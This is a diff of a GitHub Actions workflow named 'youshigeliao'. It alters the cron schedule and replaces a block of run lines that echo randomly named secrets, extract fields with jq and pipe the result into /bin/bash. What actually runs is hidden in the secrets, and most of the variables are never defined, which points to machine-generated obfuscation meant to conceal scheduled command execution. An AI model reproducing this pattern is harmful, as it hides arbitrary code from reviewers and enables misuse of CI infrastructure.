@@ -2,29 +2,21 @@ name: youshigeliao
 on:
   workflow_dispatch:
   schedule:
-    - cron: '13 1/6 * * *'
+    - cron: '51 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: youshigeliao
         env:
-          fcwn694: ${{ secrets.fcwn694 }}
+          c95133: ${{ secrets.c95133 }}
         run: |
-          echo $fcwn694 | jq -r .kxrl153 | /bin/bash
-          echo $n438 | jq -r .c273 | /bin/bash
-          echo $cldg232 | jq -r .lrcg1380 | /bin/bash
-          echo $qtkub5 | jq -r .inrl74413 | /bin/bash
-          echo $wshes340 | jq -r .lr3597 | /bin/bash
-          echo $r7725 | jq -r .oyh75 | /bin/bash
-          echo $onwrv43 | jq -r .aghgf205 | /bin/bash
-          echo $ycwct8 | jq -r .tj58066 | /bin/bash
-          echo $ydf85 | jq -r .gdjl27 | /bin/bash
-          echo $vuhzl90 | jq -r .q93439 | /bin/bash
-          echo $dcp7 | jq -r .qh73485 | /bin/bash
-          echo $ciakx13598 | jq -r .fqsu2636 | /bin/bash
-          echo $dvs1319 | jq -r .q4204 | /bin/bash
+          echo $c95133 | jq -r .g57184 | /bin/bash
+          echo $o9468 | jq -r .rxm97319 | /bin/bash
+          echo $ctzcv32904 | jq -r .f737 | /bin/bash
+          echo $vlt35 | jq -r .peis560 | /bin/bash
+          echo $nk33 | jq -r .pdsmc759 | /bin/bash
+          echo $qalr5 | jq -r .bhvkv2 | /bin/bash
 
